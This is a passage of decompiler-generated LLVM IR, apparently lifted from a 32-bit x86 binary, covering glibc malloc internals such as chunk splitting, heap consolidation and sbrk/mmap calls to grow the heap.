  %v3_80528fa = icmp eq i32 %v2_80528fa, 0
  br i1 %v3_80528fa, label %dec_label_pc_80528f5, label %dec_label_pc_80528fa.dec_label_pc_80528fe_crit_edge

dec_label_pc_80528fa.dec_label_pc_80528fe_crit_edge: ; preds = %dec_label_pc_80528f5
  store i32 %v1_80528f5, i32* %ebx.global-to-local, align 4
  store i32 %v2_80528f8, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80528fe

dec_label_pc_80528fe:                             ; preds = %dec_label_pc_80528fa.dec_label_pc_80528fe_crit_edge, %dec_label_pc_80528fa.preheader
  %v0_805290e = phi i32 [ %v2_80528f8, %dec_label_pc_80528fa.dec_label_pc_80528fe_crit_edge ], [ %esi.promoted, %dec_label_pc_80528fa.preheader ]
  %v1_8052928 = phi i32 [ %v1_80528f5, %dec_label_pc_80528fa.dec_label_pc_80528fe_crit_edge ], [ %v0_80528f512, %dec_label_pc_80528fa.preheader ]
  %v1_80528fe = add i32 %v1_8052928, 12
  %v2_80528fe = inttoptr i32 %v1_80528fe to i32*
  %v3_80528fe = load i32, i32* %v2_80528fe, align 4
  store i32 %v3_80528fe, i32* @ecx, align 4
  %v12_8052901 = icmp eq i32 %v3_80528fe, %v1_8052928
  %v1_8052903 = icmp eq i1 %v12_8052901, false
  br i1 %v1_8052903, label %dec_label_pc_8052919, label %dec_label_pc_8052905

dec_label_pc_8052905:                             ; preds = %dec_label_pc_80528fe
  %v1_8052907 = add i32 %v3_80528fe, 8
  store i32 %v1_8052907, i32* %ebx.global-to-local, align 4
  %v1_805290a = sub i32 -1, %v0_805290e
  store i32 %v1_805290a, i32* %eax.global-to-local, align 4
  %v2_805290c = and i32 %v0_805290c, %v1_805290a
  store i32 %v2_805290c, i32* %edx.global-to-local, align 4
  %v2_805290e = mul i32 %v0_805290e, 2
  store i32 %v2_805290e, i32* %esi.global-to-local, align 4
  %v1_8052910 = load i32, i32* @edi, align 4
  %v2_8052910 = mul i32 %v1_8052910, 4
  %v3_8052910 = add i32 %v2_8052910, ptrtoint (i32* @global_var_80679b4.241 to i32)
  %v4_8052910 = inttoptr i32 %v3_8052910 to i32*
  store i32 %v2_805290c, i32* %v4_8052910, align 4
  %v0_80528c6.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80528c6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052919:                             ; preds = %dec_label_pc_80528fe
  %v1_8052919 = add i32 %v3_80528fe, 4
  %v2_8052919 = inttoptr i32 %v1_8052919 to i32*
  %v3_8052919 = load i32, i32* %v2_8052919, align 4
  store i32 %v3_8052919, i32* %edx.global-to-local, align 4
  %v1_805291c = add i32 %v3_80528fe, 12
  %v2_805291c = inttoptr i32 %v1_805291c to i32*
  %v3_805291c = load i32, i32* %v2_805291c, align 4
  store i32 %v3_805291c, i32* %eax.global-to-local, align 4
  %v1_805291f = and i32 %v3_8052919, -4
  store i32 %v1_805291f, i32* %edx.global-to-local, align 4
  %v5_8052924 = sub i32 %v1_805291f, %v1_8052a16
  store i32 %v5_8052924, i32* %esi.global-to-local, align 4
  store i32 %v3_805291c, i32* %v2_80528fe, align 4
  %v0_805292b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805292b = load i32, i32* %eax.global-to-local, align 4
  %v2_805292b = add i32 %v1_805292b, 8
  %v3_805292b = inttoptr i32 %v2_805292b to i32*
  store i32 %v0_805292b, i32* %v3_805292b, align 4
  %v0_805292e = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_805292e, 16
  br i1 %tmp129, label %dec_label_pc_8052933, label %dec_label_pc_805293a

dec_label_pc_8052933:                             ; preds = %dec_label_pc_8052919
  %v0_8052933 = load i32, i32* @ecx, align 4
  %v1_8052933 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052933 = add i32 %v0_8052933, 4
  %v3_8052933 = add i32 %v2_8052933, %v1_8052933
  %v4_8052933 = inttoptr i32 %v3_8052933 to i32*
  %v5_8052933 = load i32, i32* %v4_8052933, align 4
  %v6_8052933 = or i32 %v5_8052933, 1
  store i32 %v6_8052933, i32* %v4_8052933, align 4
  br label %dec_label_pc_8052979

dec_label_pc_805293a:                             ; preds = %dec_label_pc_8052919
  store i32 %v1_8052a16, i32* %eax.global-to-local, align 4
  %v0_8052943 = load i32, i32* @ecx, align 4
  %v2_8052943 = add i32 %v0_8052943, %v1_8052a16
  store i32 %v2_8052943, i32* %edx.global-to-local, align 4
  %v1_8052946 = load i32, i32* @ebp, align 4
  %v2_8052946 = add i32 %v1_8052946, 8
  %v3_8052946 = inttoptr i32 %v2_8052946 to i32*
  store i32 %v2_8052943, i32* %v3_8052946, align 4
  %v0_8052949 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052949 = load i32, i32* @ebp, align 4
  %v2_8052949 = add i32 %v1_8052949, 12
  %v3_8052949 = inttoptr i32 %v2_8052949 to i32*
  store i32 %v0_8052949, i32* %v3_8052949, align 4
  %v0_805294c = load i32, i32* %edx.global-to-local, align 4
  %v1_805294c = add i32 %v0_805294c, 8
  %v2_805294c = inttoptr i32 %v1_805294c to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_805294c, align 4
  %v0_8052953 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052953 = add i32 %v0_8052953, 12
  %v2_8052953 = inttoptr i32 %v1_8052953 to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_8052953, align 4
  br i1 %v6_80526cf, label %dec_label_pc_8052962, label %dec_label_pc_805295c

dec_label_pc_805295c:                             ; preds = %dec_label_pc_805293a
  %v0_805295c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805295c, i32* @global_var_80676b0.238, align 16
  br label %dec_label_pc_8052962

dec_label_pc_8052962:                             ; preds = %dec_label_pc_805293a, %dec_label_pc_805295c
  %v4_8052962 = or i32 %v1_8052a16, 1
  %v0_8052967 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052962, i32* %ebx.global-to-local, align 4
  %v1_805296d = or i32 %v0_8052967, 1
  store i32 %v1_805296d, i32* %eax.global-to-local, align 4
  %v1_8052970 = load i32, i32* @ecx, align 4
  %v2_8052970 = add i32 %v1_8052970, 4
  %v3_8052970 = inttoptr i32 %v2_8052970 to i32*
  store i32 %v4_8052962, i32* %v3_8052970, align 4
  %v0_8052973 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052973 = load i32, i32* %edx.global-to-local, align 4
  %v3_8052973 = add i32 %v1_8052973, %v0_8052973
  %v4_8052973 = inttoptr i32 %v3_8052973 to i32*
  store i32 %v0_8052973, i32* %v4_8052973, align 4
  %v0_8052976 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052976 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052976 = add i32 %v1_8052976, 4
  %v3_8052976 = inttoptr i32 %v2_8052976 to i32*
  store i32 %v0_8052976, i32* %v3_8052976, align 4
  br label %dec_label_pc_8052979

dec_label_pc_8052979:                             ; preds = %dec_label_pc_8052933, %dec_label_pc_8052962
  %v0_8052979 = load i32, i32* @ecx, align 4
  %v1_8052979 = add i32 %v0_8052979, 8
  store i32 %v1_8052979, i32* @ebx, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_8052981.loopexit:                    ; preds = %dec_label_pc_80528ce
  br label %dec_label_pc_8052981

dec_label_pc_8052981:                             ; preds = %dec_label_pc_8052981.loopexit, %dec_label_pc_8052689, %dec_label_pc_8052691
  %v0_8052981 = load i32, i32* @global_var_80676ac.237, align 4
  store i32 %v0_8052981, i32* @ebx, align 4
  %v1_805298b = add i32 %v1_8052a16, 16
  store i32 %v1_805298b, i32* @esi, align 4
  %v1_805298e = add i32 %v0_8052981, 4
  %v2_805298e = inttoptr i32 %v1_805298e to i32*
  %v3_805298e = load i32, i32* %v2_805298e, align 4
  %v1_8052995 = and i32 %v3_805298e, -4
  store i32 %v1_8052995, i32* %ecx.global-to-local, align 4
  %v7_8052998 = icmp ult i32 %v1_8052995, %v1_805298b
  br i1 %v7_8052998, label %dec_label_pc_80529b8, label %dec_label_pc_805299c

dec_label_pc_805299c:                             ; preds = %dec_label_pc_8052981
  %v2_80529a0 = add i32 %v0_8052981, %v1_8052a16
  store i32 %v2_80529a0, i32* %edx.global-to-local, align 4
  %v1_80529a3 = or i32 %v1_8052a16, 1
  store i32 %v1_80529a3, i32* %eax.global-to-local, align 4
  store i32 %v2_80529a0, i32* @global_var_80676ac.237, align 4
  store i32 %v1_80529a3, i32* %v2_805298e, align 4
  %v0_80529af = load i32, i32* %ecx.global-to-local, align 4
  %v5_80529af = sub i32 %v0_80529af, %v1_8052a16
  store i32 %v5_80529af, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052d0b

dec_label_pc_80529b8:                             ; preds = %dec_label_pc_8052981
  %v0_80529b8 = load i32, i32* @global_var_80679dc.242, align 4
  store i32 %v0_80529b8, i32* %edx.global-to-local, align 4
  %v0_80529be = load i8, i8* @global_var_8067680.236, align 128
  %v1_80529be = and i8 %v0_80529be, 2
  %v2_80529be = icmp eq i8 %v1_80529be, 0
  br i1 %v2_80529be, label %dec_label_pc_80529ec, label %dec_label_pc_80529c7

dec_label_pc_80529c7:                             ; preds = %dec_label_pc_80529b8
  store i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32* %stack_var_-92, align 4
  %v2_80529cf = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067680.236 to i32*))
  store i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32* @ebx, align 4
  %v1_80529d9 = add i32 %v1_8052a16, -7
  store i32 %v1_80529d9, i32* %eax.global-to-local, align 4
  store i32 %v1_80529d9, i32* %stack_var_-92, align 4
  %v1_80529dd = call i32 @malloc(i32 %v1_80529d9)
  store i32 %v1_80529dd, i32* %eax.global-to-local, align 4
  store i32 %v1_80529dd, i32* @ebx, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_80529ec:                             ; preds = %dec_label_pc_80529b8
  %v1_80529ec = add i32 %v0_80529b8, -1
  store i32 %v1_80529ec, i32* @ecx, align 4
  store i32 %v1_8052a16, i32* @ebx, align 4
  %v1_80529f7 = load i32, i32* @global_var_80679cc.243, align 4
  %v7_80529f7 = icmp ult i32 %v1_8052a16, %v1_80529f7
  br i1 %v7_80529f7, label %dec_label_pc_8052ab9, label %dec_label_pc_8052a03

dec_label_pc_8052a03:                             ; preds = %dec_label_pc_80529ec
  %v0_8052a03 = load i32, i32* @global_var_80679d0.244, align 16
  store i32 %v0_8052a03, i32* %eax.global-to-local, align 4
  %v1_8052a08 = load i32, i32* @global_var_80679d4.245, align 4
  %v5_8052a0e = icmp slt i32 %v0_8052a03, %v1_8052a08
  br i1 %v5_8052a0e, label %dec_label_pc_8052a14, label %dec_label_pc_8052ab9

dec_label_pc_8052a14:                             ; preds = %dec_label_pc_8052a03
  %v2_8052a16 = add i32 %v1_8052a16, 10
  %v3_8052a16 = add i32 %v2_8052a16, %v0_80529b8
  %v1_8052a1a = sub i32 0, %v0_80529b8
  store i32 %v1_8052a1a, i32* %eax.global-to-local, align 4
  %v2_8052a1c = and i32 %v3_8052a16, %v1_8052a1a
  store i32 %v2_8052a1c, i32* @ebx, align 4
  %tmp134 = icmp ugt i32 %v2_8052a1c, %v1_8052a16
  br i1 %tmp134, label %dec_label_pc_8052a28, label %dec_label_pc_8052ab9

dec_label_pc_8052a28:                             ; preds = %dec_label_pc_8052a14
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052a35 = call i32 @mmap(i32 0, i32 %v2_8052a1c, i32 3, i32 34, i32 0, i32 0, i32 %v1_80529ec, i32 %v1_80529ec)
  store i32 %v8_8052a35, i32* %eax.global-to-local, align 4
  store i32 %v8_8052a35, i32* %edx.global-to-local, align 4
  %v10_8052a3f = icmp eq i32 %v8_8052a35, -1
  br i1 %v10_8052a3f, label %dec_label_pc_8052a28.dec_label_pc_8052ab9_crit_edge, label %dec_label_pc_8052a44

dec_label_pc_8052a28.dec_label_pc_8052ab9_crit_edge: ; preds = %dec_label_pc_8052a28
  %v0_8052ab9.pre = load i32, i32* @global_var_80676ac.237, align 4
  br label %dec_label_pc_8052ab9

dec_label_pc_8052a44:                             ; preds = %dec_label_pc_8052a28
  %v1_8052a46 = urem i32 %v8_8052a35, 8
  %v2_8052a46 = icmp eq i32 %v1_8052a46, 0
  store i32 %v1_8052a46, i32* @ecx, align 4
  br i1 %v2_8052a46, label %dec_label_pc_8052a5e, label %dec_label_pc_8052a4b

dec_label_pc_8052a4b:                             ; preds = %dec_label_pc_8052a44
  %v0_8052a50 = load i32, i32* @ebx, align 4
  %v2_8052a52 = sub nsw i32 8, %v1_8052a46
  store i32 %v2_8052a52, i32* %eax.global-to-local, align 4
  %v2_8052a54 = add i32 %v2_8052a52, %v8_8052a35
  store i32 %v2_8052a54, i32* %edx.global-to-local, align 4
  %v2_8052a56 = sub i32 %v0_8052a50, %v2_8052a52
  store i32 %v2_8052a56, i32* %esi.global-to-local, align 4
  %v2_8052a58 = inttoptr i32 %v2_8052a54 to i32*
  store i32 %v2_8052a52, i32* %v2_8052a58, align 4
  br label %dec_label_pc_8052a66

dec_label_pc_8052a5e:                             ; preds = %dec_label_pc_8052a44
  %v1_8052a5e = inttoptr i32 %v8_8052a35 to i32*
  store i32 0, i32* %v1_8052a5e, align 4
  br label %dec_label_pc_8052a66

dec_label_pc_8052a66:                             ; preds = %dec_label_pc_8052a4b, %dec_label_pc_8052a5e
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052a4b ], [ @ebx, %dec_label_pc_8052a5e ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052a66 = or i32 %storemerge, 2
  %v1_8052a69 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052a69 = add i32 %v1_8052a69, 4
  %v3_8052a69 = inttoptr i32 %v2_8052a69 to i32*
  store i32 %v1_8052a66, i32* %v3_8052a69, align 4
  %v0_8052a6c = load i32, i32* @global_var_80679d0.244, align 16
  %v1_8052a71 = add i32 %v0_8052a6c, 1
  store i32 %v1_8052a71, i32* %eax.global-to-local, align 4
  store i32 %v1_8052a71, i32* @global_var_80679d0.244, align 16
  %v1_8052a77 = load i32, i32* @global_var_80679d8.246, align 8
  %v7_8052a7d = icmp sgt i32 %v1_8052a71, %v1_8052a77
  br i1 %v7_8052a7d, label %dec_label_pc_8052a7f, label %dec_label_pc_8052a84

dec_label_pc_8052a7f:                             ; preds = %dec_label_pc_8052a66
  store i32 %v1_8052a71, i32* @global_var_80679d8.246, align 8
  br label %dec_label_pc_8052a84

dec_label_pc_8052a84:                             ; preds = %dec_label_pc_8052a66, %dec_label_pc_8052a7f
  %v0_8052a84 = load i32, i32* @global_var_80679e4.247, align 4
  %v1_8052a89 = load i32, i32* @ebx, align 4
  %v2_8052a89 = add i32 %v1_8052a89, %v0_8052a84
  store i32 %v2_8052a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8052a89, i32* @global_var_80679e4.247, align 4
  %v1_8052a90 = load i32, i32* @global_var_80679f0.248, align 16
  %tmp135 = icmp ugt i32 %v2_8052a89, %v1_8052a90
  br i1 %tmp135, label %dec_label_pc_8052a98, label %dec_label_pc_8052a9d

dec_label_pc_8052a98:                             ; preds = %dec_label_pc_8052a84
  store i32 %v2_8052a89, i32* @global_var_80679f0.248, align 16
  br label %dec_label_pc_8052a9d

dec_label_pc_8052a9d:                             ; preds = %dec_label_pc_8052a84, %dec_label_pc_8052a98
  %v1_8052a9d = load i32, i32* @global_var_80679e8.249, align 8
  %v2_8052a9d = add i32 %v1_8052a9d, %v2_8052a89
  store i32 %v2_8052a9d, i32* %eax.global-to-local, align 4
  %v1_8052aa3 = load i32, i32* @global_var_80679f4.250, align 4
  %tmp136 = icmp ugt i32 %v2_8052a9d, %v1_8052aa3
  br i1 %tmp136, label %dec_label_pc_8052aaf, label %dec_label_pc_8052700

dec_label_pc_8052aaf:                             ; preds = %dec_label_pc_8052a9d
  store i32 %v2_8052a9d, i32* @global_var_80679f4.250, align 4
  br label %dec_label_pc_8052700

dec_label_pc_8052ab9:                             ; preds = %dec_label_pc_8052a14, %dec_label_pc_8052a28.dec_label_pc_8052ab9_crit_edge, %dec_label_pc_8052a03, %dec_label_pc_80529ec
  %v0_8052ab9 = phi i32 [ %v0_8052ab9.pre, %dec_label_pc_8052a28.dec_label_pc_8052ab9_crit_edge ], [ %v0_8052981, %dec_label_pc_8052a03 ], [ %v0_8052981, %dec_label_pc_8052a14 ], [ %v0_8052981, %dec_label_pc_80529ec ]
  store i32 %v0_8052ab9, i32* %eax.global-to-local, align 4
  %v1_8052ac2 = add i32 %v0_8052ab9, 4
  %v2_8052ac2 = inttoptr i32 %v1_8052ac2 to i32*
  %v3_8052ac2 = load i32, i32* %v2_8052ac2, align 4
  %v1_8052acc = and i32 %v3_8052ac2, -4
  %v2_8052acc = icmp eq i32 %v1_8052acc, 0
  store i32 %v1_8052acc, i32* @ebp, align 4
  %v1_8052acf = load i32, i32* @global_var_80679c8.251, align 8
  %v2_8052acf = add i32 %v1_8052acf, %v1_805298b
  store i32 %v2_8052acf, i32* %eax.global-to-local, align 4
  %v0_8052ad5 = load i8, i8* @global_var_80679e0.252, align 32
  %v1_8052ad5 = urem i8 %v0_8052ad5, 2
  %v2_8052ad5 = icmp eq i8 %v1_8052ad5, 0
  br i1 %v2_8052ad5, label %dec_label_pc_8052ae0, label %dec_label_pc_8052ade

dec_label_pc_8052ade:                             ; preds = %dec_label_pc_8052ab9
  %v2_8052ade = sub i32 %v2_8052acf, %v1_8052acc
  store i32 %v2_8052ade, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ae0

dec_label_pc_8052ae0:                             ; preds = %dec_label_pc_8052ab9, %dec_label_pc_8052ade
  %v0_8052ae4 = phi i32 [ %v2_8052acf, %dec_label_pc_8052ab9 ], [ %v2_8052ade, %dec_label_pc_8052ade ]
  %v5_8052ae4 = add i32 %v0_8052ae4, %v1_80529ec
  store i32 %v5_8052ae4, i32* %eax.global-to-local, align 4
  %v1_8052ae8 = sub i32 0, %v0_80529b8
  store i32 %v1_8052ae8, i32* %edx.global-to-local, align 4
  %v2_8052af0 = and i32 %v5_8052ae4, %v1_8052ae8
  store i32 %v2_8052af0, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_8052af0, 1
  br i1 %tmp88, label %dec_label_pc_8052b0a, label %dec_label_pc_8052af4

dec_label_pc_8052af4:                             ; preds = %dec_label_pc_8052ae0
  store i32 %v2_8052af0, i32* %stack_var_-92, align 4
  %v1_8052af8 = call i32 @__GI_sbrk(i32 %v2_8052af0)
  store i32 %v1_8052af8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 %v1_8052af8, i32* @ebx, align 4
  %v10_8052b05 = icmp eq i32 %v1_8052af8, -1
  %v1_8052b08 = icmp eq i1 %v10_8052b05, false
  br i1 %v1_8052b08, label %dec_label_pc_8052b60, label %dec_label_pc_8052af4.dec_label_pc_8052b0a_crit_edge

dec_label_pc_8052af4.dec_label_pc_8052b0a_crit_edge: ; preds = %dec_label_pc_8052af4
  %v0_8052b0a.pre = load i8, i8* @global_var_80679e0.252, align 32
  br label %dec_label_pc_8052b0a

dec_label_pc_8052b0a:                             ; preds = %dec_label_pc_8052af4.dec_label_pc_8052b0a_crit_edge, %dec_label_pc_8052ae0
  %v0_8052b36 = phi i32 [ -1, %dec_label_pc_8052af4.dec_label_pc_8052b0a_crit_edge ], [ %v1_8052ae8, %dec_label_pc_8052ae0 ]
  %v0_8052b0a = phi i8 [ %v0_8052b0a.pre, %dec_label_pc_8052af4.dec_label_pc_8052b0a_crit_edge ], [ %v0_8052ad5, %dec_label_pc_8052ae0 ]
  %v1_8052b0a = urem i8 %v0_8052b0a, 2
  %v2_8052b0a = icmp eq i8 %v1_8052b0a, 0
  br i1 %v2_8052b0a, label %dec_label_pc_8052b0a.dec_label_pc_8052b1f_crit_edge, label %dec_label_pc_8052b13

dec_label_pc_8052b0a.dec_label_pc_8052b1f_crit_edge: ; preds = %dec_label_pc_8052b0a
  %v0_8052b1f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052b1f

dec_label_pc_8052b13:                             ; preds = %dec_label_pc_8052b0a
  %v2_8052b17 = add i32 %v1_8052acc, %v1_80529ec
  store i32 %v2_8052b17, i32* %eax.global-to-local, align 4
  %v0_8052b19 = load i32, i32* @esi, align 4
  %v2_8052b19 = add i32 %v0_8052b19, %v2_8052b17
  %v5_8052b1b = and i32 %v2_8052b19, %v1_8052ae8
  store i32 %v5_8052b1b, i32* @esi, align 4
  br label %dec_label_pc_8052b1f

dec_label_pc_8052b1f:                             ; preds = %dec_label_pc_8052b0a.dec_label_pc_8052b1f_crit_edge, %dec_label_pc_8052b13
  %v0_8052b1f = phi i32 [ %v0_8052b1f.pre, %dec_label_pc_8052b0a.dec_label_pc_8052b1f_crit_edge ], [ %v5_8052b1b, %dec_label_pc_8052b13 ]
  %tmp130 = icmp ult i32 %v0_8052b1f, 1048576
  br i1 %tmp130, label %dec_label_pc_8052b27, label %dec_label_pc_8052b2c

dec_label_pc_8052b27:                             ; preds = %dec_label_pc_8052b1f
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8052b2c

dec_label_pc_8052b2c:                             ; preds = %dec_label_pc_8052b1f, %dec_label_pc_8052b27
  %v0_8052b40 = phi i32 [ %v0_8052b1f, %dec_label_pc_8052b1f ], [ 1048576, %dec_label_pc_8052b27 ]
  %tmp137 = icmp ugt i32 %v0_8052b40, %v1_8052a16
  br i1 %tmp137, label %dec_label_pc_8052b36, label %dec_label_pc_8052d6e

dec_label_pc_8052b36:                             ; preds = %dec_label_pc_8052b2c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052b43 = call i32 @mmap(i32 0, i32 %v0_8052b40, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052b36, i32 %v0_8052b36)
  store i32 %v8_8052b43, i32* %eax.global-to-local, align 4
  store i32 %v8_8052b43, i32* @ebx, align 4
  %v10_8052b4d = icmp eq i32 %v8_8052b43, -1
  br i1 %v10_8052b4d, label %dec_label_pc_8052d6e, label %dec_label_pc_8052b56

dec_label_pc_8052b56:                             ; preds = %dec_label_pc_8052b36
  %v0_8052b56 = load i8, i8* @global_var_80679e0.252, align 1
  %v2_8052b56 = and i8 %v0_8052b56, -2
  store i8 %v2_8052b56, i8* @global_var_80679e0.252, align 32
  %v1_8052b5d = load i32, i32* @esi, align 4
  %v2_8052b5d = add i32 %v1_8052b5d, %v8_8052b43
  store i32 %v2_8052b5d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052b60

dec_label_pc_8052b60:                             ; preds = %dec_label_pc_8052af4, %dec_label_pc_8052b56
  %v0_8052c27 = phi i32 [ -1, %dec_label_pc_8052af4 ], [ %v2_8052b5d, %dec_label_pc_8052b56 ]
  %v0_8052c35 = phi i32 [ %v1_8052af8, %dec_label_pc_8052af4 ], [ %v8_8052b43, %dec_label_pc_8052b56 ]
  %v10_8052b60 = icmp eq i32 %v0_8052c35, -1
  br i1 %v10_8052b60, label %dec_label_pc_8052d6e, label %dec_label_pc_8052b69

dec_label_pc_8052b69:                             ; preds = %dec_label_pc_8052b60
  %v0_8052b6d = load i32, i32* @global_var_80679e8.249, align 8
  %v1_8052b6d = load i32, i32* @esi, align 4
  %v2_8052b6d = add i32 %v1_8052b6d, %v0_8052b6d
  store i32 %v2_8052b6d, i32* @global_var_80679e8.249, align 8
  %v2_8052b73 = add i32 %v1_8052acc, %v0_8052ab9
  store i32 %v2_8052b73, i32* %ecx.global-to-local, align 4
  %v2_8052b75 = sub i32 %v0_8052c35, %v2_8052b73
  %v7_8052b75 = icmp ult i32 %v0_8052c35, %v2_8052b73
  %v12_8052b75 = icmp eq i32 %v2_8052b75, 0
  %v1_8052b77 = icmp eq i1 %v12_8052b75, false
  br i1 %v1_8052b77, label %dec_label_pc_8052b90, label %dec_label_pc_8052b79

dec_label_pc_8052b79:                             ; preds = %dec_label_pc_8052b69
  %v10_8052b79 = icmp eq i32 %v0_8052c27, -1
  %v1_8052b7c = icmp eq i1 %v10_8052b79, false
  br i1 %v1_8052b7c, label %dec_label_pc_8052b90, label %dec_label_pc_8052b7e

dec_label_pc_8052b7e:                             ; preds = %dec_label_pc_8052b79
  %v2_8052b7e = add i32 %v1_8052b6d, %v1_8052acc
  store i32 %v0_8052ab9, i32* %ecx.global-to-local, align 4
  %v1_8052b85 = or i32 %v2_8052b7e, 1
  store i32 %v1_8052b85, i32* %eax.global-to-local, align 4
  store i32 %v1_8052b85, i32* %v2_8052ac2, align 4
  br label %dec_label_pc_8052cbd

dec_label_pc_8052b90:                             ; preds = %dec_label_pc_8052b79, %dec_label_pc_8052b69
  %v0_8052b90 = load i8, i8* @global_var_80679e0.252, align 1
  %v1_8052b90 = sext i8 %v0_8052b90 to i32
  store i32 %v1_8052b90, i32* %eax.global-to-local, align 4
  %v2_8052b95 = urem i8 %v0_8052b90, 2
  %v3_8052b95 = icmp eq i8 %v2_8052b95, 0
  br i1 %v3_8052b95, label %dec_label_pc_8052ba9, label %dec_label_pc_8052b99

dec_label_pc_8052b99:                             ; preds = %dec_label_pc_8052b90
  br i1 %v2_8052acc, label %dec_label_pc_8052ba9, label %dec_label_pc_8052b9d

dec_label_pc_8052b9d:                             ; preds = %dec_label_pc_8052b99
  %v1_8052b9f = icmp eq i1 %v7_8052b75, false
  br i1 %v1_8052b9f, label %dec_label_pc_8052ba9, label %dec_label_pc_8052ba1

dec_label_pc_8052ba1:                             ; preds = %dec_label_pc_8052b9d
  %v1_8052ba1 = and i32 %v1_8052b90, -2
  %v4_8052ba1 = trunc i32 %v1_8052ba1 to i8
  store i32 %v1_8052ba1, i32* %eax.global-to-local, align 4
  store i8 %v4_8052ba1, i8* @global_var_80679e0.252, align 32
  br label %dec_label_pc_8052ba9

dec_label_pc_8052ba9:                             ; preds = %dec_label_pc_8052b9d, %dec_label_pc_8052b99, %dec_label_pc_8052b90, %dec_label_pc_8052ba1
  %v0_8052ba9 = phi i8 [ %v0_8052b90, %dec_label_pc_8052b9d ], [ %v0_8052b90, %dec_label_pc_8052b99 ], [ %v0_8052b90, %dec_label_pc_8052b90 ], [ %v4_8052ba1, %dec_label_pc_8052ba1 ]
  %v1_8052ba9 = urem i8 %v0_8052ba9, 2
  %v2_8052ba9 = icmp eq i8 %v1_8052ba9, 0
  br i1 %v2_8052ba9, label %dec_label_pc_8052c27, label %dec_label_pc_8052bb2

dec_label_pc_8052bb2:                             ; preds = %dec_label_pc_8052ba9
  br i1 %v2_8052acc, label %dec_label_pc_8052bc0, label %dec_label_pc_8052bb6

dec_label_pc_8052bb6:                             ; preds = %dec_label_pc_8052bb2
  store i32 %v2_8052b75, i32* %eax.global-to-local, align 4
  %v2_8052bba = add i32 %v2_8052b6d, %v2_8052b75
  store i32 %v2_8052bba, i32* @global_var_80679e8.249, align 8
  br label %dec_label_pc_8052bc0

dec_label_pc_8052bc0:                             ; preds = %dec_label_pc_8052bb2, %dec_label_pc_8052bb6
  %v1_8052bc2 = urem i32 %v0_8052c35, 8
  %v2_8052bc2 = icmp eq i32 %v1_8052bc2, 0
  store i32 %v1_8052bc2, i32* %edx.global-to-local, align 4
  %v1_8052bc5 = icmp eq i1 %v2_8052bc2, false
  br i1 %v1_8052bc5, label %dec_label_pc_8052bcd, label %dec_label_pc_8052bc7

dec_label_pc_8052bc7:                             ; preds = %dec_label_pc_8052bc0
  store i32 %v0_8052c35, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052bd7

dec_label_pc_8052bcd:                             ; preds = %dec_label_pc_8052bc0
  %v2_8052bd2 = sub nsw i32 8, %v1_8052bc2
  store i32 %v2_8052bd2, i32* %eax.global-to-local, align 4
  %v2_8052bd4 = add i32 %v2_8052bd2, %v0_8052c35
  store i32 %v2_8052bd4, i32* @edi, align 4
  br label %dec_label_pc_8052bd7

dec_label_pc_8052bd7:                             ; preds = %dec_label_pc_8052bc7, %dec_label_pc_8052bcd
  %v0_8052bda = phi i32 [ 0, %dec_label_pc_8052bc7 ], [ %v2_8052bd2, %dec_label_pc_8052bcd ]
  %v2_8052bd7 = add i32 %v1_8052b6d, %v0_8052c35
  %v2_8052bda = add i32 %v0_8052bda, %v1_8052acc
  store i32 %v2_8052bda, i32* %ecx.global-to-local, align 4
  %v2_8052be3 = add i32 %v2_8052bda, %v2_8052bd7
  store i32 %v2_8052be3, i32* %edx.global-to-local, align 4
  %v2_8052be9 = add i32 %v2_8052be3, %v1_80529ec
  %v5_8052bec = and i32 %v2_8052be9, %v1_8052ae8
  %v2_8052bf3 = sub i32 %v5_8052bec, %v2_8052be3
  store i32 %v2_8052bf3, i32* %eax.global-to-local, align 4
  %v2_8052bf5 = add i32 %v2_8052bf3, %v2_8052bda
  store i32 %v2_8052bf5, i32* @esi, align 4
  store i32 %v2_8052bf5, i32* %stack_var_-92, align 4
  %v1_8052bf9 = call i32 @__GI_sbrk(i32 %v2_8052bf5)
  store i32 %v1_8052bf9, i32* %eax.global-to-local, align 4
  store i32 %v1_8052bf9, i32* %edx.global-to-local, align 4
  %v10_8052c03 = icmp eq i32 %v1_8052bf9, -1
  %v1_8052c06 = icmp eq i1 %v10_8052c03, false
  br i1 %v1_8052c06, label %dec_label_pc_8052c16, label %dec_label_pc_8052c08

dec_label_pc_8052c08:                             ; preds = %dec_label_pc_8052bd7
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052c0d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052c0d, i32* %eax.global-to-local, align 4
